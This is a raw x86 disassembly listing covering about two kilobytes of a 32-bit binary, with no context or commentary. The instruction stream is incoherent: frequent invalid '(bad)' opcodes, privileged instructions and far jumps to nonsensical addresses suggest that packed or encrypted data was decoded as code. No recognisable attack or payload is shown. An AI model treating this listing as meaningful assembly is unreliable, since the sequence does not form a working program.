  4156b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156b3:	inc    esp
  4156b4:	inc    esi
  4156b5:	and    al,cl
  4156b7:	or     al,0x58
  4156b9:	mov    ecx,0x70cc6a23
  4156be:	(bad)  
  4156bf:	adc    esp,DWORD PTR [edx+0x11]
  4156c2:	xchg   ebp,eax
  4156c3:	sahf   
  4156c4:	fild   DWORD PTR [esi+ecx*4+0x10]
  4156c8:	mov    bl,0xf5
  4156ca:	icebp  
  4156cb:	stc    
  4156cc:	sti    
  4156cd:	arpl   WORD PTR [eax],bx
  4156cf:	nop
  4156d0:	push   es
  4156d1:	add    BYTE PTR [esi+0x24],al
  4156d4:	(bad)  
  4156d6:	sahf   
  4156d7:	jne    0x4156b1
  4156d9:	inc    ebp
  4156da:	xlat   BYTE PTR ds:[ebx]
  4156db:	inc    DWORD PTR [eax]
  4156dd:	cdq    
  4156de:	mov    cl,0x17
  4156e0:	xor    ch,BYTE PTR [esi]
  4156e2:	(bad)
  4156e5:	push   ebx
  4156e6:	es adc ebx,0x47
  4156ea:	push   ss
  4156eb:	xchg   edx,eax
  4156ec:	ret    0xb8e9
  4156ef:	jae    0x4156e2
  4156f1:	retf   
  4156f2:	mov    ebx,DWORD PTR [ebx-0x3a]
  4156f5:	dec    eax
  4156f6:	bound  ebp,QWORD PTR [esi]
  4156f8:	(bad)  
  4156f9:	cli    
  4156fa:	aaa    
  4156fb:	gs push ebx
  4156fe:	test   BYTE PTR [edi+0x12],bl
  415701:	xor    eax,0xc691b6a6
  415706:	inc    eax
  415707:	fstp   TBYTE PTR [ebx-0x6d]
  41570a:	add    BYTE PTR [edx],ch
  41570c:	arpl   WORD PTR [ebp-0x5],di
  41570f:	add    dh,BYTE PTR [eax+edx*1+0x1ce44a9b]
  415716:	inc    ecx
  415717:	cmp    al,dl
  415719:	ret    
  41571a:	push   edx
  41571b:	push   ebx
  41571c:	jp     0x4156a3
  41571e:	mov    edi,0xfb43168d
  415723:	ds pop si
  415726:	(bad)  
  415727:	fld    TBYTE PTR [esp+ebx*1+0x508eca62]
  41572e:	lahf   
  41572f:	inc    esp
  415730:	jl     0x415710
  415732:	inc    ebx
  415733:	add    ebp,DWORD PTR [edi]
  415735:	sbb    BYTE PTR [eax-0x4],0x39
  415739:	push   edx
  41573a:	cmp    eax,esp
  41573c:	adc    bh,BYTE PTR [ecx]
  41573e:	mov    dh,0x59
  415740:	sbb    bh,BYTE PTR [esi+0x63be80aa]
  415746:	loopne 0x4156db
  415748:	iret   
  415749:	mov    ch,0x43
  41574b:	nop
  41574c:	aam    0xde
  41574e:	pop    ecx
  41574f:	pop    ecx
  415750:	xchg   esi,eax
  415751:	test   eax,0xe2cbed30
  415756:	les    esp,FWORD PTR [edi+0x24857179]
  41575c:	cdq    
  41575d:	sub    BYTE PTR [ebx],ch
  41575f:	aam    0x33
  415761:	adc    eax,0xf4f2aedc
  415766:	repnz fisttp WORD PTR [eax+0x61]
  41576b:	cwde   
  41576c:	and    ecx,DWORD PTR [esi]
  41576e:	retf   0x2977
  415771:	iret   
  415772:	(bad)  
  415773:	ins    BYTE PTR es:[edi],dx
  415774:	mov    ebx,ebp
  415776:	sub    BYTE PTR [eax+0x7b],0x32
  41577a:	hlt    
  41577b:	xchg   esp,eax
  41577c:	adc    bh,0xf1
  41577f:	in     eax,0x97
  415781:	lea    eax,ds:0x2cb2ead1
  415787:	aam    0x1c
  415789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41578a:	test   eax,0x536f7120
  41578f:	nop
  415790:	scas   al,BYTE PTR es:[edi]
  415791:	and    bh,ah
  415793:	mov    dh,0xc0
  415795:	fild   WORD PTR [edi-0x671124d2]
  41579b:	jmp    0x8a82:0x96477148
  4157a2:	inc    esi
  4157a3:	push   esp
  4157a4:	dec    ebx
  4157a5:	cmp    DWORD PTR [edx],edi
  4157a7:	jmp    0x4157b7
  4157a9:	sub    eax,0xc1763c5c
  4157ae:	fnstcw WORD PTR [ebx]
  4157b0:	in     al,dx
  4157b1:	lods   al,BYTE PTR ds:[esi]
  4157b2:	or     ah,BYTE PTR [edi+0x1e65eb9a]
  4157b8:	into   
  4157b9:	and    ah,dh
  4157bb:	hlt    
  4157bc:	loope  0x415776
  4157be:	pop    ss
  4157bf:	dec    eax
  4157c0:	lds    ebx,FWORD PTR [edx+0x7c8b0305]
  4157c6:	pop    esp
  4157c7:	imul   edx,DWORD PTR [ecx+0x1f],0x32
  4157cb:	test   DWORD PTR [edi-0x7],ecx
  4157ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cf:	rcl    ecx,1
  4157d1:	dec    esp
  4157d2:	xchg   edi,eax
  4157d3:	es out 0x8f,eax
  4157d6:	jge    0x4157af
  4157d8:	jecxz  0x415769
  4157da:	test   al,0x28
  4157dc:	sbb    al,0x4a
  4157de:	dec    esp
  4157df:	jno    0x41578a
  4157e1:	cmp    BYTE PTR [ecx-0x5474f385],bh
  4157e7:	stos   BYTE PTR es:[edi],al
  4157e8:	add    eax,0xb24ff4c6
  4157ed:	pop    ds
  4157ee:	addr16 push esi
  4157f0:	dec    ecx
  4157f1:	das    
  4157f2:	test   esp,eax
  4157f4:	loope  0x41578c
  4157f6:	pop    ebx
  4157f7:	aam    0xcd
  4157f9:	sahf   
  4157fa:	mov    ah,0x49
  4157fc:	adc    ebx,DWORD PTR [ebp+0xcec19da]
  415802:	mov    ds:0xf79a01ed,al
  415807:	repnz sub DWORD PTR [esi-0x51bd6fb2],eax
  41580e:	pop    ds
  41580f:	jp     0x4157f0
  415811:	mov    dl,0xb
  415813:	xchg   edx,eax
  415814:	mov    ecx,0x2e8776de
  415819:	fcomp  QWORD PTR [esi-0x3c84bdf0]
  41581f:	mov    ch,0x2d
  415821:	pop    ebp
  415822:	nop
  415823:	inc    ebp
  415824:	sbb    eax,0x4621018
  415829:	lds    edx,FWORD PTR [edi+0x23]
  41582c:	ds mov ebx,0xeef23312
  415832:	jo     0x41587c
  415834:	add    BYTE PTR [ecx],bh
  415836:	fcmovne st,st(6)
  415838:	imul   ebp,DWORD PTR [edx-0x28569500],0xfffffff6
  41583f:	shl    edx,cl
  415841:	pop    eax
  415842:	jns    0x4158c2
  415844:	adc    eax,0x18a05210
  415849:	repz lahf 
  41584b:	sar    BYTE PTR [ecx-0x5bc8eba8],1
  415851:	mov    edx,0xe4376e10
  415856:	(bad)  
  415857:	xor    al,0xbe
  415859:	fnsave [edi]
  41585b:	in     al,0x42
  41585d:	mov    dh,0x6
  41585f:	clc    
  415860:	imul   eax,DWORD PTR [edi],0xffffffc5
  415863:	test   al,0x62
  415865:	sbb    DWORD PTR [ebx],ebp
  415867:	push   es
  415868:	das    
  415869:	or     al,0xe8
  41586b:	sbb    BYTE PTR [eax+0x37df0e4b],dh
  415871:	aaa    
  415872:	dec    esp
  415873:	jle    0x4157fa
  415875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415876:	dec    eax
  415877:	xor    BYTE PTR [edi+0x21],cl
  41587a:	mov    bh,0xad
  41587c:	imul   ecx,esp,0x54
  41587f:	(bad)  
  415880:	dec    edi
  415882:	push   esi
  415883:	call   0x4fca:0xbe73e428
  41588a:	(bad)  
  41588b:	jecxz  0x4158b4
  41588d:	dec    edi
  41588e:	aaa    
  41588f:	mov    cl,0xde
  415891:	ror    esi,0xd5
  415894:	inc    edx
  415895:	and    DWORD PTR [ecx],edx
  415897:	test   al,0x8a
  415899:	scas   eax,DWORD PTR es:[edi]
  41589a:	lods   al,BYTE PTR ds:[esi]
  41589b:	nop
  41589c:	mov    edx,edi
  41589e:	inc    ebx
  41589f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a0:	test   al,0xc9
  4158a2:	mov    ch,0x66
  4158a4:	dec    ecx
  4158a5:	push   ebp
  4158a6:	xor    BYTE PTR [ebx],dh
  4158a8:	adc    eax,0xf96ee807
  4158ad:	ret    
  4158ae:	pop    edx
  4158af:	lahf   
  4158b0:	xchg   esi,eax
  4158b1:	stos   BYTE PTR es:[edi],al
  4158b2:	sbb    eax,0xba45a8fe
  4158b7:	push   0xffffffd5
  4158b9:	sub    cl,BYTE PTR [esi+0x5d]
  4158bc:	adc    al,0xa4
  4158be:	das    
  4158bf:	pop    ebp
  4158c0:	xor    ebx,ecx
  4158c2:	jp     0x41585c
  4158c4:	enter  0xaf34,0xcc
  4158c8:	mov    dl,0x41
  4158ca:	jne    0x4158eb
  4158cc:	xor    ch,bl
  4158ce:	ins    BYTE PTR es:[edi],dx
  4158cf:	xchg   ebp,eax
  4158d0:	mov    esp,0xb13c838f
  4158d5:	lods   al,BYTE PTR ds:[esi]
  4158d6:	imul   ebx,DWORD PTR [ebx],0xfd210e13
  4158dc:	pop    esi
  4158dd:	in     al,0x45
  4158df:	dec    esp
  4158e0:	into   
  4158e1:	in     eax,0xa1
  4158e3:	test   BYTE PTR [edi+0x3d],dh
  4158e6:	cmp    DWORD PTR [ebp-0x67c576f9],edx
  4158ec:	ror    DWORD PTR ds:0x776945d,0x1c
  4158f3:	test   DWORD PTR [ecx-0x5b],esi
  4158f6:	dec    esi
  4158f7:	icebp  
  4158f8:	pop    eax
  4158f9:	call   0x474c:0x52c0d8d9
  415900:	imul   edi,DWORD PTR [eax-0xa4b2aec],0x17
  415907:	fs add bh,al
  41590a:	mov    dh,cl
  41590c:	repnz xor esp,edx
  41590f:	daa    
  415910:	hlt    
  415911:	neg    DWORD PTR [ebp+0x2f496779]
  415917:	lea    ebx,[ebx]
  415919:	stos   BYTE PTR es:[edi],al
  41591a:	mov    ebx,0xb2595c90
  41591f:	xor    bl,ah
  415921:	jl     0x4158f2
  415923:	int    0x3
  415925:	scas   al,BYTE PTR es:[edi]
  415926:	push   es
  415927:	and    ch,bh
  415929:	in     eax,0x8f
  41592b:	out    dx,al
  41592c:	leave  
  41592d:	and    al,0xc9
  41592f:	mov    esi,0xbf9d161e
  415934:	ret    
  415935:	pop    ds
  415936:	in     al,dx
  415937:	rcl    DWORD PTR [ecx],0xe1
  41593a:	pop    ebx
  41593b:	or     bl,BYTE PTR [ebp-0x6e]
  41593e:	rcl    BYTE PTR [ebx],0x8f
  415941:	nop
  415942:	js     0x41594b
  415944:	xor    eax,0x5f91552d
  415949:	mov    BYTE PTR [ecx],bh
  41594b:	push   ebx
  41594c:	pop    ds
  41594d:	outs   dx,DWORD PTR ds:[esi]
  41594e:	push   esi
  41594f:	mul    DWORD PTR [ecx-0x6]
  415952:	or     bh,BYTE PTR [ecx]
  415954:	clc    
  415955:	(bad)  
  415956:	pop    edx
  415957:	pop    ds
  415958:	in     eax,dx
  415959:	mov    ds,ecx
  41595b:	push   ds
  41595c:	push   ds
  41595d:	call   FWORD PTR [esi-0x3]
  415960:	xchg   edx,eax
  415961:	adc    al,0x76
  415963:	add    ah,BYTE PTR [esi+0x66]
  415966:	int3   
  415967:	daa    
  415968:	stos   BYTE PTR es:[edi],al
  415969:	adc    ch,BYTE PTR [edx]
  41596b:	(bad)  
  41596c:	(bad)  
  41596d:	mov    eax,0x64ae43a3
  415972:	imul   edi,DWORD PTR [ecx-0x3834f604],0x4e03ca1b
  41597c:	popf   
  41597d:	cmp    eax,0xb0cc001a
  415982:	ins    DWORD PTR es:[edi],dx
  415983:	test   ecx,edx
  415985:	(bad)  
  415986:	or     al,0x34
  415988:	and    al,0xb9
  41598a:	call   0xdb9bcfd0
  41598f:	mov    eax,0xf308d9e5
  415994:	cmp    DWORD PTR [ebx],esi
  415996:	cmc    
  415997:	sbb    eax,0x19cb0a0c
  41599c:	sbb    DWORD PTR [ecx-0x52],ecx
  41599f:	iret   
  4159a0:	in     eax,dx
  4159a1:	mov    bl,0x8f
  4159a3:	js     0x4159b5
  4159a5:	pop    esp
  4159a6:	adc    cl,ch
  4159a8:	stc    
  4159a9:	mov    ecx,esp
  4159ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159ac:	mov    dl,0xf6
  4159ae:	xchg   ecx,eax
  4159af:	xor    eax,0x6a2b06b8
  4159b4:	test   DWORD PTR [esi],0x567b4883
  4159ba:	ss jo  0x415a24
  4159bd:	loope  0x415a34
  4159bf:	pop    eax
  4159c0:	mov    ah,BYTE PTR [ebp+0x4131eaf9]
  4159c6:	adc    ah,BYTE PTR [eax]
  4159c8:	in     eax,dx
  4159c9:	out    0x56,eax
  4159cb:	pop    esp
  4159cc:	rcr    edx,1
  4159ce:	mov    ch,0x96
  4159d0:	jmp    0xe6c0:0xfe875b4a
  4159d7:	push   ss
  4159d8:	ss and eax,0x14bda7ec
  4159df:	in     al,0xaf
  4159e1:	popf   
  4159e2:	mov    ds:0x7a7cc28f,eax
  4159e7:	ret    
  4159e8:	mov    al,BYTE PTR [eax]
  4159ea:	pop    ebx
  4159eb:	jmp    0x7646e42b
  4159f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159f1:	test   eax,0x7e656137
  4159f6:	or     BYTE PTR [edx-0x6ffcea0b],al
  4159fc:	ss in  al,0x3d
  4159ff:	mov    edi,0x7be9db55
  415a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a05:	pop    ecx
  415a06:	sbb    bh,BYTE PTR [esi]
  415a08:	push   eax
  415a09:	inc    esi
  415a0a:	push   0x71
  415a0c:	add    al,0xf4
  415a0e:	jb     0x4159f5
  415a10:	out    dx,eax
  415a11:	mov    ecx,0x2cac3128
  415a16:	sbb    DWORD PTR [edi-0x12802c3d],0xffffffa2
  415a1d:	jae    0x415a48
  415a1f:	xchg   ecx,eax
  415a20:	sub    DWORD PTR [ecx+0x22],edi
  415a23:	adc    ch,BYTE PTR [ebp+esi*1+0x12dbe3f9]
  415a2a:	jmp    0xb6457fa2
  415a2f:	aad    0x41
  415a31:	(bad)  
  415a32:	out    dx,al
  415a33:	rcr    DWORD PTR [esi],0x6d
  415a36:	pop    DWORD PTR [edi]
  415a38:	out    dx,al
  415a39:	lea    edi,[edx-0x2deb97c]
  415a3f:	sbb    eax,0x75e3dce8
  415a44:	jbe    0x415a1c
  415a46:	lock sbb ch,bl
  415a49:	push   0x33
  415a4b:	jne    0x415a07
  415a4d:	addr16 push ebp
  415a4f:	mov    ds:0x12050e03,al
  415a54:	jae    0x4159f8
  415a56:	cmc    
  415a57:	xchg   edx,eax
  415a58:	sub    DWORD PTR [edi+edi*4+0x5c],ebp
  415a5c:	gs push ebp
  415a5e:	xchg   esp,eax
  415a5f:	fnstcw WORD PTR [edx+0x60]
  415a62:	leave  
  415a63:	pop    edi
  415a64:	into   
  415a65:	fwait
  415a66:	cs jl  0x415a22
  415a69:	scas   eax,DWORD PTR es:[edi]
  415a6a:	mov    BYTE PTR [edx],ah
  415a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a6d:	fcom   QWORD PTR [edi+edx*2+0x43]
  415a71:	cdq    
  415a72:	loop   0x415a97
  415a74:	sub    DWORD PTR [ecx-0x64],edi
  415a77:	mov    esi,0x5c657091
  415a7c:	gs loopne 0x415a5d
  415a7f:	and    BYTE PTR [edi-0xea483f7],bh
  415a85:	mov    edi,0x57012146
  415a8a:	cmp    ecx,DWORD PTR [edx+ecx*4-0x7c6acfc9]
  415a91:	jb     0x415a5d
  415a93:	fnstsw WORD PTR [eax+0x69]
  415a96:	xchg   ebx,eax
  415a97:	xchg   al,al
  415a99:	fnstenv [edi+0x2d]
  415a9c:	push   eax
  415a9d:	adc    bl,BYTE PTR [ebx+0x2c72acde]
  415aa3:	dec    edx
  415aa4:	pop    ecx
  415aa5:	call   0x5bd0:0xcf0c9ae7
  415aac:	pop    esi
  415aad:	sbb    al,0x2e
  415aaf:	mov    esp,0xb0164b58
  415ab4:	int3   
  415ab5:	sub    DWORD PTR [eax-0x7],edx
  415ab8:	xchg   DWORD PTR [edi+0x2e568408],esp
  415abe:	jecxz  0x415af1
  415ac0:	add    BYTE PTR [ebp-0x5c],dh
  415ac3:	and    esp,DWORD PTR [edx+0x3c]
  415ac6:	xor    edi,DWORD PTR [eax-0x5f]
  415ac9:	(bad)  
  415aca:	fwait
  415acb:	mov    cl,0x8e
  415acd:	hlt    
  415ace:	loope  0x415b34
  415ad0:	pop    ecx
  415ad1:	or     dh,BYTE PTR [eax-0x7ea03e01]
  415ad7:	cld    
  415ad8:	mov    al,ds:0x53819f6a
  415add:	push   0xc1f6ecaa
  415ae2:	push   edi
  415ae3:	mov    esi,0xf2b7d2dc
  415ae8:	je     0x415b15
  415aea:	push   edx
  415aeb:	or     BYTE PTR [ebx],0xf6
  415aee:	inc    ebx
  415aef:	or     BYTE PTR [ebx],bh
  415af1:	push   ecx
  415af2:	add    DWORD PTR [edi+0x73c9f38],ebp
  415af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415af9:	mov    ch,0xb3
  415afb:	nop
  415afc:	add    ebp,DWORD PTR [ecx]
  415afe:	adc    BYTE PTR [ebx-0x57eaa10c],0x4a
  415b05:	sti    
  415b06:	jmp    0xef14153a
  415b0b:	lods   al,BYTE PTR ds:[esi]
  415b0c:	popf   
  415b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b0e:	jmp    0xc9b3f044
  415b13:	sbb    al,0x40
  415b15:	cmp    al,0x90
  415b17:	fisub  WORD PTR [eax-0x2e]
  415b1a:	mov    ?,WORD PTR [esi+0x4e]
  415b1d:	dec    eax
  415b1e:	ja     0x415b15
  415b20:	test   eax,0x82b01be9
  415b25:	mov    eax,0xd21f4c04
  415b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b2b:	jle    0x415ad6
  415b2d:	push   ds
  415b2e:	pop    eax
  415b2f:	mov    eax,ds:0xe7632c14
  415b34:	outs   dx,BYTE PTR ds:[esi]
  415b35:	or     bh,ch
  415b37:	sub    al,cl
  415b39:	pop    ebp
  415b3a:	test   DWORD PTR [edx],eax
  415b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b3d:	fcom   st(0)
  415b3f:	mov    esi,0xd8f9baf0
  415b44:	adc    al,0xab
  415b46:	mov    esp,0x40034214
  415b4b:	loope  0x415bb6
  415b4d:	jecxz  0x415ba2
  415b4f:	ret    
  415b50:	scas   al,BYTE PTR es:[edi]
  415b51:	lahf   
  415b52:	pop    edx
  415b53:	arpl   WORD PTR [edx-0x65ae14b9],cx
  415b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5a:	xchg   ebx,eax
  415b5b:	mov    ebx,0x1e3f95a7
  415b60:	inc    ebp
  415b61:	mov    al,ds:0x29de2fe
  415b66:	xchg   esi,eax
  415b67:	loopne 0x415b11
  415b69:	and    DWORD PTR [ebx-0x210402b6],edx
  415b6f:	and    eax,0x9eaf7fc
  415b74:	cmp    al,0x5a
  415b76:	and    DWORD PTR [esi-0x4a],edx
  415b79:	dec    eax
  415b7a:	mov    dl,0x1a
  415b7c:	mov    ch,0x73
  415b7e:	or     BYTE PTR [eax+0x67],cl
  415b81:	bswap  ecx
  415b83:	test   DWORD PTR [ebx-0x183ec263],ebx
  415b89:	rcr    BYTE PTR [edx-0x22],cl
  415b8c:	push   ebx
  415b8d:	inc    ecx
  415b8e:	test   eax,0xe5f82af3
  415b93:	call   0xe190:0xbbe9a9a8
  415b9a:	popa   
  415b9b:	fwait
  415b9c:	dec    edx
  415b9d:	add    eax,0x5442fd83
  415ba2:	stos   DWORD PTR es:[edi],eax
  415ba3:	sbb    dl,cl
  415ba5:	sub    BYTE PTR [ebp-0x6fd1cda9],dh
  415bab:	jg     0x415bee
  415bad:	std    
  415bae:	iret   
  415baf:	mov    ebp,0x44720c36
  415bb4:	cdq    
  415bb5:	pop    ebx
  415bb6:	call   0x8774b42b
  415bbb:	mov    eax,0xbc59bae4
  415bc0:	psadbw mm2,QWORD PTR [eax+0x274b19ea]
  415bc7:	dec    edx
  415bc8:	fnstsw WORD PTR [edx]
  415bca:	fnclex 
  415bcc:	xchg   esi,eax
  415bcd:	jb     0x415b9d
  415bcf:	mov    bh,0x1a
  415bd1:	pop    edi
  415bd2:	ins    BYTE PTR es:[edi],dx
  415bd3:	or     al,0xb2
  415bd5:	data16 jne 0x415b60
  415bd8:	not    DWORD PTR [esi-0x3e]
  415bdb:	xor    BYTE PTR [ebp-0x14],ch
  415bde:	cmp    DWORD PTR [eax+0x5e6e0be6],eax
  415be4:	fst    DWORD PTR [ebx-0x1c0ee27c]
  415bea:	daa    
  415beb:	ds mov dl,0x1c
  415bee:	xor    BYTE PTR [edx],bl
  415bf0:	push   edi
  415bf1:	rcr    esi,1
  415bf3:	retf   
  415bf4:	push   ss
  415bf5:	xor    ch,ch
  415bf7:	aas    
  415bf8:	sub    BYTE PTR [esi+0x2981925c],bh
  415bfe:	daa    
  415bff:	out    dx,al
  415c00:	cmp    DWORD PTR [esi],0x4c
  415c03:	mov    esi,0x1019db84
  415c08:	jnp    0x415c71
  415c0a:	in     eax,dx
  415c0b:	int3   
  415c0c:	or     dh,BYTE PTR [esi+edx*8]
  415c0f:	and    al,0xe1
  415c11:	not    ah
  415c13:	xchg   BYTE PTR ds:0x6fe0e306,dl
  415c19:	icebp  
  415c1a:	and    BYTE PTR [ebx],dh
  415c1c:	test   BYTE PTR [edx-0x6246169b],dh
  415c22:	xlat   BYTE PTR ds:[ebx]
  415c23:	in     al,0x9f
  415c25:	push   edx
  415c26:	ins    DWORD PTR es:[edi],dx
  415c27:	pop    ecx
  415c28:	mov    al,ds:0x7c01e70b
  415c2d:	mov    al,0x8d
  415c2f:	pop    ebp
  415c30:	lock dec ebx
  415c32:	cmp    eax,0xf526b2d3
  415c37:	cwde   
  415c38:	jge    0x415c60
  415c3a:	xchg   DWORD PTR ds:0xe2d37e72,edi
  415c40:	xchg   BYTE PTR [ecx+0x3d],ch
  415c43:	sub    eax,0x9eb8cce8
  415c48:	pop    ebp
  415c49:	xlat   BYTE PTR ds:[ebx]
  415c4a:	clc    
  415c4b:	test   DWORD PTR [esp+eiz*8+0x67],eax
  415c4f:	lods   al,BYTE PTR ds:[esi]
  415c50:	clc    
  415c51:	iret   
  415c52:	mov    eax,0x6eee9603
  415c57:	add    cl,ah
  415c59:	pop    esp
  415c5a:	(bad)  
  415c5b:	mov    dl,ch
  415c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c5e:	sub    al,0xb0
  415c60:	and    BYTE PTR [edi+0xd],ch
  415c63:	cdq    
  415c64:	mov    eax,ds:0x52938140
  415c69:	pop    ebp
  415c6a:	rcl    BYTE PTR [ebx],cl
  415c6c:	pop    ss
  415c6d:	out    0x3,eax
  415c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c70:	mov    ebx,0x898199c6
  415c75:	xor    ebp,DWORD PTR [ecx+0x89aa45e]
  415c7b:	rcl    DWORD PTR [edi-0x2d],1
  415c7e:	xchg   ebp,eax
  415c7f:	cmp    ah,BYTE PTR [ebx+0x7f]
  415c82:	scas   al,BYTE PTR es:[edi]
  415c83:	mov    esp,esp
  415c85:	arpl   WORD PTR [ecx-0x50],sp
  415c88:	xchg   al,bl
  415c8a:	mov    ds,WORD PTR [edi]
  415c8c:	and    al,0xc2
  415c8e:	(bad)  
  415c8f:	fmul   QWORD PTR [eax-0x6accc11e]
  415c95:	adc    al,0x32
  415c97:	dec    edx
  415c98:	jge    0x415cee
  415c9a:	or     BYTE PTR [ebp-0x5a0012bd],bh
  415ca0:	jo     0x415c6f
  415ca2:	sub    ecx,DWORD PTR [ebp-0x1a29c589]
  415ca8:	std    
  415ca9:	sbb    edx,DWORD PTR [ebx+0xa355e83]
  415caf:	cmc    
  415cb0:	cs fs pusha 
  415cb3:	data16 aas 
  415cb5:	mov    ebx,0x93de417a
  415cba:	stos   DWORD PTR es:[edi],eax
  415cbb:	jmp    0xc13d:0x31b2bbc
  415cc2:	push   cs
  415cc3:	jnp    0x415d29
  415cc5:	push   edi
  415cc6:	aad    0x45
  415cc8:	mov    ebx,0x241b2930
  415ccd:	outs   dx,BYTE PTR ds:[esi]
  415cce:	xor    al,bl
  415cd0:	sub    ch,BYTE PTR [ebp+eax*1-0x18]
  415cd4:	fadd   DWORD PTR [edx]
  415cd6:	sar    BYTE PTR [edi+0x45ab67e1],0xd9
  415cdd:	pop    ss
  415cde:	jmp    0x7d91:0x5a9ed175
  415ce5:	jecxz  0x415d17
  415ce7:	pop    ebp
  415ce8:	mov    ebp,DWORD PTR [edi]
  415cea:	mov    ds:0xd78dcc07,eax
  415cef:	xchg   esp,eax
  415cf0:	or     DWORD PTR [edx+eax*4+0x26],esi
  415cf4:	aaa    
  415cf5:	out    dx,al
  415cf6:	jae    0x415d64
  415cf8:	mov    ebx,0x819f251e
  415cfd:	pusha  
  415cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cff:	(bad)  
  415d00:	sub    bh,BYTE PTR [ebp-0x67e2e5ac]
  415d06:	fild   DWORD PTR [esi]
  415d08:	mov    edx,0x681faf70
  415d0d:	mov    ecx,0x52ab3df1
  415d12:	imul   esp,ebp,0x9e3e44e
  415d18:	out    0x1,eax
  415d1a:	xchg   BYTE PTR [edx],ah
  415d1c:	cdq    
  415d1d:	clc    
  415d1e:	push   cs
  415d1f:	xor    al,0x2
  415d21:	fistp  QWORD PTR [esi+eiz*8]
  415d24:	and    DWORD PTR [eax],edi
  415d26:	arpl   WORD PTR [esi-0x62],dx
  415d29:	(bad)  
  415d2a:	fdiv   DWORD PTR [edx]
  415d2c:	mov    ds:0x8eeaa219,al
  415d31:	pop    ss
  415d32:	cmp    ebx,DWORD PTR [ecx+esi*2-0x3]
  415d36:	scas   al,BYTE PTR es:[edi]
  415d37:	icebp  
  415d38:	ins    DWORD PTR es:[edi],dx
  415d39:	and    eax,0xd4633e5
  415d3e:	sahf   
  415d3f:	cdq    
  415d40:	repnz xor BYTE PTR [eax],ch
  415d43:	cmc    
  415d44:	mov    ds:0xe6dcc89,eax
  415d49:	xor    bh,BYTE PTR [ecx+esi*4-0x7817df07]
  415d50:	mov    bh,0x95
  415d52:	push   ebp
  415d53:	or     eax,0x11e47444
  415d58:	cmovs  eax,DWORD PTR [edx+esi*2+0x44]
  415d5d:	ins    DWORD PTR es:[edi],dx
  415d5e:	data16 or dh,bl
  415d61:	add    ecx,DWORD PTR [ebp-0x65]
  415d64:	push   edx
  415d65:	adc    DWORD PTR ds:0xb2af1b20,eax
  415d6b:	mov    esi,ss
  415d6d:	lds    esi,FWORD PTR [edx+0xb]
  415d70:	dec    ebp
  415d71:	dec    ebx
  415d72:	mov    bh,0xf1
  415d74:	push   edx
  415d75:	pop    ebp
  415d76:	jnp    0x415d3b
  415d78:	adc    dh,BYTE PTR [ecx+0x12]
  415d7b:	fistp  DWORD PTR [eax-0x2c]
  415d7e:	je     0x415df4
  415d80:	inc    BYTE PTR ds:0x5f050710
  415d86:	dec    edx
  415d87:	or     al,0x6b
  415d89:	mov    cl,0xfa
  415d8b:	xchg   ebx,eax
  415d8c:	sub    dl,BYTE PTR [ebp+0x79]
  415d8f:	and    DWORD PTR [esi],edx
  415d91:	add    DWORD PTR [esi],esi
  415d93:	push   ss
  415d94:	add    ebp,esi
  415d96:	or     eax,0xc16b4807
  415d9b:	xor    al,0xeb
  415d9d:	aad    0xd5
  415d9f:	fistp  QWORD PTR cs:[edi*2-0x59c473a6]
  415da7:	out    dx,al
  415da8:	xor    DWORD PTR [ecx+0x74],ebp
  415dab:	rcl    DWORD PTR [ebx+0x592d039e],1
  415db1:	ss inc esp
  415db3:	dec    ebx
  415db4:	push   0xffffff94
  415db6:	or     cl,BYTE PTR [eax]
  415db8:	or     ebx,ebx
  415dba:	cs ins BYTE PTR es:[edi],dx
  415dbc:	sub    BYTE PTR [ebx+edi*2+0x7e1b422c],dl
  415dc3:	sahf   
  415dc4:	cdq    
  415dc5:	cs adc eax,0xfbf18fbb
  415dcb:	jne    0x415e41
  415dcd:	mov    ch,0x4e
  415dcf:	mov    eax,ds:0xb796011d
  415dd4:	lock aam 0x9
  415dd7:	mov    WORD PTR [edx+0x57],cs
  415dda:	ret    0xb45a
  415ddd:	test   BYTE PTR [ecx-0x79ef310a],al
  415de3:	mov    al,ds:0x9b1365a2
  415de8:	push   eax
  415de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dea:	retf   
  415deb:	sub    eax,0x80aff035
  415df0:	inc    eax
  415df1:	push   ss
  415df2:	push   cs
  415df3:	stc    
  415df4:	test   DWORD PTR [esi+0xc8a759d],ebx
  415dfa:	scas   al,BYTE PTR es:[edi]
  415dfb:	adc    DWORD PTR [eax],esi
  415dfd:	dec    ecx
  415dfe:	jmp    DWORD PTR [esp+ebp*2-0x2b9b8f04]
  415e05:	jp     0x415dd7
  415e07:	cmp    BYTE PTR [ebp-0x6a6ada4d],bl
  415e0d:	mov    dh,0x7b
  415e0f:	test   BYTE PTR [ebx],ah
  415e11:	xor    ecx,0xffffff93
  415e14:	mov    WORD PTR [eax],ds
  415e16:	punpckhwd mm1,QWORD PTR [esi-0x3da419bf]
  415e1d:	push   0x1e
  415e1f:	inc    eax
  415e20:	add    ch,BYTE PTR ds:0x977a77ab
  415e26:	push   0x64b2aced
  415e2b:	mov    al,0x8d
  415e2d:	icebp  
  415e2e:	lea    edi,[edi]
  415e30:	push   ecx
  415e31:	jp     0x415e0b
  415e33:	cli    
  415e34:	fst    QWORD PTR [eax]
  415e36:	add    BYTE PTR [ebp+0x20c1dd22],ah
  415e3c:	aaa    
  415e3d:	cli    
  415e3e:	es or  esp,ebx
  415e41:	and    bh,BYTE PTR [esi-0x16]
  415e44:	mov    dh,0x79
